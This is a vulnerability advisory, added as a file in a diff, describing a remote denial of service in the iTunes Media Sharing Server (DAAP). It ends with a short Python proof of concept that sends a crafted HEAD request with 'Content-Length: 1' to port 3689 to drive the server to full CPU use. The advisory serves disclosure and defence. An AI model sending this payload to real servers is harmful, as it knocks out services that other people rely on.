@@ -1,0 +1,56 @@
+Apple iTunes Media Sharing Server Remote Denial of Service
+
+Severity:           Low/Medium
+
+Time line:          2006-01-12 Discovery
+
+Author:             Christoph Diehl <posidron@xophdware.com>
+
+Software affected:  iTunes v7.0.2.16 and earlier - all platforms.
+
+                    Tested on:
+                        * iTunes v7.0.2.16 (Windows - Version 5.1.2600)
+
+Vendor:             http://www.apple.com/de/itunes/download/
+
+                    References:
+                        * http://daap.sourceforge.net/docs/index.html
+                        * http://www.opendaap.org/
+
+
+I. BACKGROUND
+
+iTunes is a digital media player application, introduced by Apple on
+January 10, 2001 at Macworld Expo in San Francisco, for playing and
+organizing digital music and video files.
+
+iTunes Library songs can be shared over a local network using the closed,
+proprietary Digital Audio Access Protocol (DAAP), created by Apple for
+this purpose.
+
+(Source: http://en.wikipedia.org/wiki/ITunes)
+
+
+II. DESCRIPTION
+
+A special crafted HTTP packet forces the iTunes Media Sharing Server
+to use 100% CPU ressources and the user to a restart of the application.
+
+The Media Sharing Server is not enabled by default.
+To activate the Media Sharing Server: Edit -> Settings -> Share
+
+
+III. PROOF OF CONCEPT
+
+# -*- coding: ISO-8859-1 -*-
+import socket
+
+payload = """
+HEAD / HTTP/1.0
+Content-Length: 1
+"""
+
+iTunesSocket = socket.socket()
+iTunesSocket.connect(("127.0.0.1", 3689))
+iTunesSocket.send(payload+"\r\n\r\n")
+iTunesSocket.close()
